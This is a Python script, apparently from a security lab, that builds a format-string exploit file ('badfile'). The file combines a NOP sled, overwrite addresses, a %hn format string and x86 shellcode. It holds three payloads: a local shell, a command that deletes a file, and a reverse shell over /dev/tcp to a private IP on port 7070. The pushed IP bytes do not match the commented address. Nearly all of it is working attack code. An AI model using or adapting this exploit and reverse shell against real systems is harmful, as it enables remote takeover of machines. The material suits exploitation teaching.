#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

# Run "/bin/bash -c '/bin/rm /tmp/myfile'"
malicious_code= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax

    # Push the 2nd argument into the stack:
    #       '/bin/rm /tmp/myfile' 
    # Students need to use their own VM's IP address
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""    "                    # pushl (an integer)
    "\x68""ile "                    # pushl (an integer)
    "\x68""/myf"                    # pushl (an integer)
    "\x68""/tmp"                    # pushl (an integer)
    "\x68""/rm "                    # pushl (an integer)
    "\x68""/bin"                    # pushl (an integer)
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx   

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al 
    "\xcd\x80"                      # int $0x80
).encode('latin-1')

# This shellcode creates a reverse shell
reverse_shellcode= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax

    # Push the 2nd argument '/bin/bash -i >/dev/tcp/10.0.2.6/7070 0<&1 2>&1' into stack
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""    "                    # pushl data
    "\x68""2>&1"
    "\x68""    "
    "\x68""0<&1"
    "\x68""070 "
    "\x68""06/7"
    "\x68"".1.1"
    "\x68"".168"
    "\x68""/192"
    "\x68""/tcp"
    "\x68""/dev"
    "\x68""   >"
    "\x68""h -i"
    "\x68""/bas"
    "\x68""/bin"
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx   

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al 
    "\xcd\x80"                      # int $0x80
).encode('latin-1')



N = 1200
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
#start = N - len(reverse_shellcode)
#content[start:] = reverse_shellcode

start = N - len(malicious_code) 
content[start:] = malicious_code

#start = N - len(local_shellcode) 
#content[start:] = local_shellcode

# Put the address at the beginning
#addr1 = 0xAABBCCDD
#addr2 = 0x11223344
addr1 = 0xbffff088+6  #epb+6
addr2 = 0xbffff088+4   #ebp+4
content[0:4]  =  (addr1).to_bytes(4,byteorder='little')
content[4:8]  =  ("@@@@").encode('latin-1')
content[8:12]  = (addr2).to_bytes(4,byteorder='little')

# Calculate the value of C
C = 30 

# For investigation purpose (trial and error)
#s = "%.8x_"*C + "\n"
#s = "%.8x_"*C + "%n"  + "\n"

# Construct the format string
#small = 0x6677 - 12 - C*8
#large = 0x8899 - 0x6677
small = 0xbfff - 12 - C*8
large = 0xf170 - 0xbfff

s = "%.8x"*C + "%." + str(small) + "x" + "%hn"        \
                   + "%." + str(large) + "x" + "%hn" + "\n"
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()

